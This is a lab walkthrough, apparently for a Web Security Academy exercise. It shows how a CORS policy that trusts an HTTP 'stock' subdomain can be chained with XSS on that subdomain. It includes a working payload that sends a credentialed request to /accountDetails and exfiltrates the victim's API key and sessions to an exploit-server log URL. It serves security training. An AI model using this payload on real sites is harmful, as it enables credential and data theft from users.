# CORS vulnerability with trusted insecure protocols

## Lab Description

This lab demonstrates a CORS vulnerability where the application trusts insecure HTTP origins from a subdomain.

The application exposes sensitive account information through the `/accountDetails` endpoint. The endpoint returns an API key and session information when the request is authenticated.

The goal is to exploit the CORS configuration and retrieve the victim's API key.

## Vulnerability

The `/accountDetails` endpoint returns:

```http
Access-Control-Allow-Credentials: true
```

The application also trusts an insecure HTTP origin from the `stock` subdomain:

```http
Origin: http://stock.<LAB-ID>.web-security-academy.net
```

The server responds with:

```http
Access-Control-Allow-Origin: http://stock.<LAB-ID>.web-security-academy.net
Access-Control-Allow-Credentials: true
```

Because the trusted origin uses HTTP and the subdomain contains an XSS vulnerability, an attacker can execute JavaScript from the trusted origin and make authenticated cross-origin requests.

## Steps

### 1. Find the `/accountDetails` endpoint

Using Burp Suite, intercept the request:

```http
GET /accountDetails HTTP/2
```

The endpoint returns sensitive account information.

The response contains:

```http
Access-Control-Allow-Credentials: true
```

The JSON response contains information such as:

```json
{
    "username": "wiener",
    "email": "...",
    "apikey": "...",
    "sessions": [
        "..."
    ]
}
```

### 2. Test the CORS configuration

Send the request to Burp Repeater and add an `Origin` header pointing to the `stock` subdomain:

```http
Origin: http://stock.<LAB-ID>.web-security-academy.net
```

The response should contain:

```http
Access-Control-Allow-Origin: http://stock.<LAB-ID>.web-security-academy.net
Access-Control-Allow-Credentials: true
```

This confirms that the application trusts the insecure HTTP subdomain.

### 3. Identify the vulnerable subdomain

The `stock` subdomain contains a stock-checking feature.

The feature can be accessed using:

```text
http://stock.<LAB-ID>.web-security-academy.net/
```

The stock functionality is vulnerable to XSS.

This allows JavaScript to execute from the trusted `stock` origin.

### 4. Create the exploit

Open the exploit server and create an exploit that causes the victim's browser to load the vulnerable `stock` page.

The payload makes an authenticated request to `/accountDetails`:

```html
<script>
document.location="http://stock.<LAB-ID>.web-security-academy.net/?productId=4<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://<LAB-ID>.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://<EXPLOIT-SERVER-ID>.exploit-server.net/log?key='
    + encodeURIComponent(this.responseText);
}
</script>&storeId=1"
</script>
```

Replace `<LAB-ID>` with the actual lab identifier.

Replace `<EXPLOIT-SERVER-ID>` with the actual exploit server identifier.

### 5. Understand the payload

The payload first loads the vulnerable stock page:

```javascript
document.location="http://stock.<LAB-ID>.web-security-academy.net/?productId=4<script>
```

The XSS payload then creates an XMLHttpRequest:

```javascript
var req = new XMLHttpRequest();
```

The request targets the sensitive endpoint:

```javascript
req.open(
    'get',
    'https://<LAB-ID>.web-security-academy.net/accountDetails',
    true
);
```

Credentials are included using:

```javascript
req.withCredentials = true;
```

The request is then sent:

```javascript
req.send();
```

### 6. Exfiltrate the response

The response is captured using the `onload` handler:

```javascript
function reqListener() {
    location='https://<EXPLOIT-SERVER-ID>.exploit-server.net/log?key='
    + encodeURIComponent(this.responseText);
}
```

This URL-encodes the `/accountDetails` response and sends it to the exploit server's `/log` endpoint.

### 7. Store and deliver the exploit

On the exploit server:

1. Enter the payload in the body.
2. Click **Store**.
3. Click **View exploit** to verify the payload.
4. Click **Deliver exploit to victim**.

The victim's browser executes the payload.

### 8. Check the access log

Open the exploit server's **Access log**.

The victim's request should appear in the log.

The `key` parameter contains the URL-encoded response from `/accountDetails`.

After decoding it, the response contains the victim's account information, including the API key.

Example:

```json
{
    "username": "administrator",
    "email": "",
    "apikey": "<API-KEY>",
    "sessions": [
        "..."
    ]
}
```

### 9. Submit the API key

Copy the administrator's API key from the response and submit it to complete the lab.

## Burp Suite Verification

The important request is:

```http
GET /accountDetails HTTP/2
Host: <LAB-ID>.web-security-academy.net
Origin: http://stock.<LAB-ID>.web-security-academy.net
```

The vulnerable response contains:

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: http://stock.<LAB-ID>.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
```

The response contains sensitive information:

```json
{
    "username": "wiener",
    "email": "...",
    "apikey": "...",
    "sessions": [
        "..."
    ]
}
```

## Why the Vulnerability Works

The attack depends on several conditions working together:

1. The application exposes sensitive information through `/accountDetails`.
2. The application allows credentialed CORS requests.
3. The application trusts the `stock` subdomain.
4. The trusted subdomain uses HTTP.
5. The `stock` subdomain contains an XSS vulnerability.
6. The attacker uses the XSS to make the authenticated request.
7. The response is exfiltrated to the exploit server.

## Attack Chain

```text
CORS trusts HTTP stock subdomain
                |
                v
      XSS on stock subdomain
                |
                v
      Execute attacker JavaScript
                |
                v
       Request /accountDetails
                |
                v
      withCredentials = true
                |
                v
       CORS allows the origin
                |
                v
    Read authenticated response
                |
                v
    Send response to exploit server
                |
                v
       Retrieve API key
```

## Important Headers

### Origin

The `Origin` header identifies the origin making the cross-origin request:

```http
Origin: http://stock.<LAB-ID>.web-security-academy.net
```

### Access-Control-Allow-Origin

The server indicates that the origin is trusted:

```http
Access-Control-Allow-Origin: http://stock.<LAB-ID>.web-security-academy.net
```

### Access-Control-Allow-Credentials

The server permits credentials to be included in the cross-origin request:

```http
Access-Control-Allow-Credentials: true
```

## Key Concept

The main issue is not simply that CORS is enabled.

The dangerous configuration is that the application trusts an insecure HTTP origin that can be compromised through XSS while also allowing credentialed cross-origin requests.

An attacker can therefore execute JavaScript from the trusted origin, access authenticated resources, and exfiltrate sensitive information.

## Conclusion

This lab demonstrates how a CORS misconfiguration involving a trusted insecure protocol can be chained with XSS.

The attack uses:

- CORS misconfiguration
- A trusted HTTP subdomain
- XSS on the trusted subdomain
- Credentialed cross-origin requests
- Sensitive data exposed through `/accountDetails`
- Exfiltration through the exploit server

The final result is the retrieval of the administrator's API key.
